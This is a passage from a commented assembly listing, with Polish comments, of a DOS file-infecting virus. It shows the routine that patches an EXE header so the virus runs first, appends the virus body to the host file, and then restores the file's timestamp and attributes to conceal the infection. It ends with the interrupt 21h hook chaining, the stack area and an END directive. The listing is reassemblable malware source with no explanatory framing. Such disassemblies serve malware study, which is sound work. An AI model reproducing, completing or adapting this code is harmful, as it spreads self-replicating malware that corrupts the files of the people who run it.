        MOV     L0051,DX                ;last page bytes        ;96C0 89 16 51 00
        MOV     AX,L007C                ;nowa dlugosc calosci   ;96C4 A1 7C 00
        MOV     DX,L007E                                        ;96C7 8B 16 7E 00
        DIV     WORD PTR L007A          ;na paragrafy           ;96CB F7 36 7A 00
        SUB     AX,L0057                ;header size            ;96CF 2B 06 57 00
        MOV     L0065,AX                ;CS wirusa              ;96D3 A3 65 00
        MOV     WORD PTR L0063,OFFSET L00C4     ;IP wirusa      ;96D6 C7 06 63 00 C4 00
        MOV     L005D,AX                ;SS wirusa              ;96DC A3 5D 00
        MOV     WORD PTR L005F,OFFSET L065D     ;SP wirusa      ;96DF C7 06 5F 00 5D 06
        XOR     CX,CX                                           ;96E5 33 C9
        MOV     DX,CX                                           ;96E7 8B D1
        MOV     AX,4200h                ;Move file ptr BOF+offs ;96E9 B8 00 42
        INT     21H                                             ;96EC CD 21
L96EE:  JB      L96FA                                           ;96EE 72 0A
        MOV     CX,1Ch                  ;zapis zmodyf. headera  ;96F0 B9 1C 00
        MOV     DX,OFFSET L004F                                 ;96F3 BA 4F 00
        MOV     AH,40H                  ;write handle           ;96F6 B4 40
        INT     21H                                             ;96F8 CD 21
L96FA:  JB      L970D                                           ;96FA 72 11
        CMP     AX,CX                                           ;96FC 3B C1
        JNZ     L9723                   ;-> nie cale poszlo     ;96FE 75 23
        MOV     DX,L007C                ;nowa dlugosc zbioru    ;9700 8B 16 7C 00
        MOV     CX,L007E                                        ;9704 8B 0E 7E 00
        MOV     AX,4200h                ;Move file ptr BOF+offs ;9708 B8 00 42
        INT     21H                                             ;970B CD 21
L970D:  JB      L9723                                           ;970D 72 14
        XOR     DX,DX                                           ;970F 33 D2
        MOV     CX,065Fh                                        ;9711 B9 5F 06
        MOV     AH,40H                  ;Write Handle           ;9714 B4 40
        INT     21H                                             ;9716 CD 21
        MOV     CX,5                                            ;9718 B9 05 00
        LEA     DX,L0005                                        ;971B 8D 16 05 00
        MOV     AH,40H                  ;Write Handle           ;971F B4 40
        INT     21H                                             ;9721 CD 21

        ;<----- wspolny koniec
L9723:  CMP     WORD PTR CS:L008F,0     ;znacznik zajecia bloku ;9723 2E 83 3E 8F 00 00
        JZ      L972F                                           ;9729 74 04
        MOV     AH,49H                  ;Free allocated memory  ;972B B4 49
        INT     21H                                             ;972D CD 21
L972F:  CMP     WORD PTR CS:L0070,-1    ;File handle            ;972F 2E 83 3E 70 00 FF
        JZ      L9768                   ;-> nie otwarty         ;9735 74 31
        MOV     BX,CS:L0070             ;File handle            ;9737 2E 8B 1E 70 00
        MOV     DX,CS:L0074                                     ;973C 2E 8B 16 74 00
        MOV     CX,CS:L0076                                     ;9741 2E 8B 0E 76 00
        MOV     AX,5701h                ;Set File Time/Date     ;9746 B8 01 57
        INT     21H                                             ;9749 CD 21
        MOV     AH,3EH                  ;Close Handle           ;974B B4 3E
        INT     21H                                             ;974D CD 21
        PUSH    CS                                              ;974F 0E
        POP     DS                                              ;9750 1F
        LDS     DX,DWORD PTR L0080      ;ptr nazwy zbioru       ;9751 C5 16 80 00
        MOV     CX,CS:L0072             ;atry zarazanego zbioru ;9755 2E 8B 0E 72 00
        MOV     AX,4301h                ;Set File Attributes    ;975A B8 01 43
        INT     21H                                             ;975D CD 21
        LEA     DX,L001B                                        ;975F 8D 16 1B 00
        MOV     AX,2524h                ;Set int 24h vector     ;9763 B8 24 25
        INT     21H                                             ;9766 CD 21
L9768:  POP     ES                                              ;9768 07
        POP     DS                                              ;9769 1F
        POP     DI                                              ;976A 5F
        POP     SI                                              ;976B 5E
        POP     DX                                              ;976C 5A
        POP     CX                                              ;976D 59
        POP     BX                                              ;976E 5B
        POP     AX                                              ;976F 58
        POPF                                                    ;9770 9D
        JMP     DWORD PTR CS:L0017      ;old int 21h            ;9771 2E FF 2E 17 00

L05F6   dw      03FCh           ;<- adres wektora int ff        ;9776 FC 03
        dw      0                                               ;9778 00 00

        ;<------ stos
        db      0                               ;977A 00

        dw      0                               ;977B 00 00
        dw      0                               ;977D 00 00
        dw      0                               ;977F 00 00
        dw      0                               ;9781 00 00
        dw      0                               ;9783 00 00
        dw      0                               ;9785 00 00
        dw      0                               ;9787 00 00
        dw      0                               ;9789 00 00
        dw      0                               ;978B 00 00
        dw      0                               ;978D 00 00
        dw      0                               ;978F 00 00
        dw      0                               ;9791 00 00
        dw      0                               ;9793 00 00
        dw      0                               ;9795 00 00
        dw      0                               ;9797 00 00
        dw      0                               ;9799 00 00
        dw      0                               ;979B 00 00
        dw      0                               ;979D 00 00
        dw      0                               ;979F 00 00
        dw      0                               ;97A1 00 00
        dw      0                               ;97A3 00 00
        dw      0                               ;97A5 00 00
        dw      0                               ;97A7 00 00
        dw      156Ch                           ;97A9 6C 15
        dw      1261h                           ;97AB 61 12
        dw      2524h                           ;97AD 24 25
        dw      0005h                           ;97AF 05 00
        dw      0020h                           ;97B1 20 00
        dw      04EBh                           ;97B3 EB 04
        dw      0006h                           ;97B5 06 00
        dw      156Ch                           ;97B7 6C 15
        dw      2508h                           ;97B9 08 25
        dw      0FEA5h                          ;97BB A5 FE
        dw      07BCh                           ;97BD BC 07
        dw      0216h                           ;97BF 16 02
        dw      065Eh                           ;97C1 5E 06
        dw      156Ch                           ;97C3 6C 15
        dw      0C89h                           ;97C5 89 0C
        dw      012Fh                           ;97C7 2F 01
        dw      7F04h                           ;97C9 04 7F
        dw      0075h                           ;97CB 75 00
        dw      065Eh                           ;97CD 5E 06
        dw      5A1Dh                           ;97CF 1D 5A
        dw      0                               ;97D1 00 00
        dw      9301h                           ;97D3 01 93
        dw      0BA6h                           ;97D5 A6 0B
        dw      0213h                           ;97D7 13 02
        dw      0C89h                           ;97D9 89 0C
        dw      0F202h                          ;97DB 02 F2
L065D   dw      2700h           ;szczyt stosu   ;97DD 00 27

L065F   DB      0C8H,0F7h,0E1h,0EEh,0E7h        ;97DF C8 F7 E1 EE E7
L0664   label   byte
S9180   ENDS

        END     L9244

